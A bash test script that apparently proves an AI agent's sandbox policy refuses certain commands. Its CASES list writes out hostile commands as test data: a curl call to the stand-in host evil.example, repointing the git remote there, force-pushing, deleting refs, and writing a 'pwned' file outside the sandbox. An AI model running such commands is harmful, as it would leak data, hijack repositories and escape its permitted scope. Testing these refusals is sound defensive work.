#!/usr/bin/env bash
# Prove every refusal D11 names, through the real session API (LOB-8).
#
#   ./refusals.sh
#
# One API instance per case: the faux script that calls `bash` is fixed when the process boots
# (`FAUX_COMMAND`), and a session runs one tool call. The four cases the issue's acceptance names
# come first; the rest of D11's always-blocked list follows; `allow` is the control that a policy
# refusing everything cannot pass.
#
# Env: API_PORT (base port, default 9600), EVIDENCE_DIR, API_URL not used here.
set -uo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../.." && pwd)"
BASE_PORT="${API_PORT:-9600}"
RUN_DIR="$ROOT/.verify/run-policy"
PROBE_PATH="$RUN_DIR/escaped.txt"
export EVIDENCE_DIR="${EVIDENCE_DIR:-$ROOT/.verify/evidence/latest}"

# case:the bash command the scripted model calls
CASES=(
  "push-main:git push origin main"
  "force-push:git push --force origin refs/heads/factory/ses_1"
  "delete-ref:git push origin :refs/heads/factory/ses_1"
  "write-outside:echo pwned > $PROBE_PATH"
  "tag-push:git push --tags"
  "remote-change:git remote set-url origin https://evil.example/x"
  "egress:curl https://evil.example/x"
  "allow:echo faux-ok"
)

mkdir -p "$RUN_DIR" "$EVIDENCE_DIR"
rm -f "$PROBE_PATH"
# A stale aggregate from an earlier run must not make a skipped case look passed.
rm -f "$EVIDENCE_DIR/refusals.json" "$EVIDENCE_DIR"/refusal-*.json

failed=0
for index in "${!CASES[@]}"; do
  entry="${CASES[$index]}"
  case_name="${entry%%:*}"
  command="${entry#*:}"
  port=$((BASE_PORT + index))

  echo "=== $case_name: $command"
  if ! API_PORT="$port" FAUX_COMMAND="$command" "$ROOT/.pi/skills/verify-policy/up.sh"; then
    echo "FAIL  $case_name  (the api did not start)" >&2
    failed=1
    continue
  fi

  # `FAUX_COMMAND` is repeated here for the record, not for the API: the instance booted above is
  # the one that runs the scripted command, and the driver only writes the value into its evidence.
  # Without it every `refusal-<case>.json` would claim a `fauxCommand` of `undefined`.
  if ! CASE="$case_name" API_URL="http://localhost:$port" PROBE_PATH="$PROBE_PATH" \
       FAUX_COMMAND="$command" bun "$ROOT/.pi/skills/verify-policy/drive.ts"; then
    failed=1
  fi

  API_PORT="$port" "$ROOT/.pi/skills/verify-policy/down.sh"
done

if [ "$failed" -ne 0 ]; then
  echo "FAIL  verify-policy: at least one refusal was not proven — see $EVIDENCE_DIR" >&2
  exit 1
fi

echo "PASS  verify-policy: every refusal proven — evidence in $EVIDENCE_DIR/refusals.json"
